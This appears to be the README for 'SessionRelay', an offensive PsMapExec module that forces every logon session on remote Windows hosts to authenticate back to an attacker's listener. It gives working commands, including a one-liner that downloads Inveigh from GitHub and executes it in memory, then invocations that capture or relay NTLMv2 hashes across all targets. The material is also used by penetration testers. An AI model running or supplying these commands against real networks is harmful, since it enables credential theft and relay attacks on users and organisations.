# SessionRelay

Creates a cmd.exe process as each user logon session on the remote system and connects back to a non-existent share to the host specified by -ListenerIP. This can then be used with tools such as Inveigh or Responder to capture NTLMv2 hashes, or with ntlmrelayx to relay captured hashes.

# Usage

Before using the module, ensure a listener such as Inveigh or Responder is running. The below example covers usage for capturing hashes with Inveigh.

### Load Inveigh into memory

    iex (iwr -UseBasicParsing https://raw.githubusercontent.com/Kevin-Robertson/Inveigh/master/Inveigh.ps1)

### Execute Inveigh (as admin), ensuring to specify the current systems IP address

    Invoke-Inveigh -ConsoleOutput Y -NBNS Y -mDNS Y -HTTPS Y -Proxy Y -IP 10.10.10.7

### Run PsMapExec, ensuring -ListenerIP is set to the same IP address as above.

    PsMapExec [Method] -Targets all -Module sessionrelay -ListenerIP 10.10.10.7

# Optional Parameters

### 1) Displays each targets output to the console

    -ShowOutput

### 2) Display only successful results

    -SuccessOnly

# Supported Methods

1) SMB 

2) SessionHunter

3) WMI 

4) WinRM
